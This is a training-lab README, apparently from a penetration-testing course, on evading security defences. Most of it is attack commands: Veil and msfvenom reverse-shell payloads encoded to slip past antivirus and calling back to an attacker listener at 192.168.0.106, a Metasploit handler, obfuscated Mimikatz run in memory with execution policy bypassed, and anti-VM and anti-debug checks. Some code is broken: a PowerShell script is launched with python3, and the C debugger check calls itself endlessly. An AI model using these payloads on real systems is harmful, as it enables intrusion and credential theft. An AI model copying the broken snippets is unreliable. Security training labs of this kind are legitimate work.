# Unit 6 - Evasión de Defensas

## Objectives

1. Learn evasion techniques to bypass security systems
2. Understand signature-based defense evasion
3. Master behavioral analysis evasion
4. Learn anti-debugging and anti-VM techniques
5. Understand modern defense mechanisms

## Tools Included

- **Kali Linux**: Penetration testing distribution
- **Veil-Evasion**: Payload obfuscation
- **Meterpreter**: Advanced payload
- **Covenant**: Command and control
- **Powershell Empire**: PowerShell C2

## Lab Setup

### Build and Start Containers

```bash
cd docker-labs/unit6
docker-compose up -d
```

### Access the Lab

1. **Web Interface**: http://localhost:8085 (Kali Desktop via noVNC)
2. **SSH Access**:
   ```bash
   ssh root@localhost -p 2227
   Password: toor
   ```

### Stop and Cleanup

```bash
cd docker-labs/unit6
docker-compose down

# Remove volumes (deletes all data)
docker-compose down -v
```

## Lab Exercises

### Exercise 1: Payload Obfuscation with Veil

1. Generate obfuscated payload:
   ```bash
   veil
   use evasion/hta_attack
   set LHOST 192.168.0.106
   set LPORT 4444
   generate
   ```

2. Deliver and execute the payload:
   ```bash
   python3 -m http.server 80
   ```

### Exercise 2: Meterpreter Evasion

1. Generate advanced Meterpreter payload:
   ```bash
   msfvenom -p windows/meterpreter/reverse_https \
     LHOST=192.168.0.106 LPORT=4443 \
     -e x86/shikata_ga_nai -i 5 \
     -f exe -o meterpreter.exe
   ```

2. Start handler:
   ```bash
   msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST 192.168.0.106; set LPORT 4443; run"
   ```

### Exercise 3: PowerShell Evasion

1. Generate obfuscated PowerShell script:
   ```bash
   python3 Invoke-Obfuscation.ps1 -ScriptBlock 'Invoke-Mimikatz' -Command 'Token\All'
   ```

2. Execute in memory:
   ```bash
   powershell -ExecutionPolicy Bypass -EncodedCommand <encoded_script>
   ```

### Exercise 4: Anti-Analysis Techniques

1. Detect virtualization:
   ```powershell
   Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select-Object Manufacturer, Model
   ```

2. Detect debugging:
   ```c
   BOOL IsDebuggerPresent()
   {
       return IsDebuggerPresent();
   }
   ```

## Resources

- [Veil Framework](https://www.veil-framework.com/)
- [Meterpreter Documentation](https://docs.metasploit.com/docs/payloads/meterpreter.html)
- [Covenant C2](https://github.com/cobbr/Covenant)
- [PowerShell Empire](https://github.com/BC-SECURITY/Empire)

## Troubleshooting

### Payload won't execute

Check antivirus logs on target system

### Connection refused

Verify handler is running on correct port:
```bash
netstat -tuln
```
